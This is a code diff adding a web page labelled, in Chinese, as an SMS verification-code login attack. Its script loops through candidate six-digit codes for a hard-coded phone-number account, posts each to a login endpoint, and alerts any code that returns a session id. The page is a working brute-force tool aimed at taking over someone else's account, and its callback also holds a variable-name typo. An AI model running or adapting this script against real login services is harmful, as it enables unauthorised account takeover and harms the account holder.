@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<?php require_once($_SERVER['DOCUMENT_ROOT'].'/global.php');?>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title></title>
+    <link rel="stylesheet" type="text/css" href="<?=STYLES?>base.css" />
+    <link rel="stylesheet" type="text/css" href="<?=STYLES?>layout.css" />
+</head>
+<body>
+<div class="layout">
+    <a id="login-btn" class="btn btn-primary">短信验证码登录攻击</a>
+</div>
+<script type="text/javascript" src="/scripts/jquery.js?ininin=<?=VERSION?>"></script>
+<script type="text/javascript" src="/scripts/tools.js?ininin=<?=VERSION?>"></script>
+<script type="text/javascript">
+    require(["base", "tools"], function($, T, Uploader){
+        function login(){
+            for(var a=2; a<3; a++){
+                for(var b=0; b<1; b++){
+                    for(var c=8; c<9; c++){
+                        for(var d=2; d<3; d++){
+                            for(var e=1; e<10; e++){
+                                for(var f=1; f<10; f++){
+                                    var codes = [a, b, c, d, e, f];
+                                    T.POST({
+                                        action: "in_user/login",
+                                        params: {
+                                            username: "13632574171",
+                                            code: codes.join("")
+                                        },
+                                        success: function(data, parmas){
+                                            T.alt("验证码为：" + params.code + "【" + data.sid+ "】")
+                                        },
+                                        failure: function(){}
+                                    });
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        $("#login-btn").on("click", function(e){
+            login();
+            return false;
+        });
+    });
+</script>
+</body>
+</html>
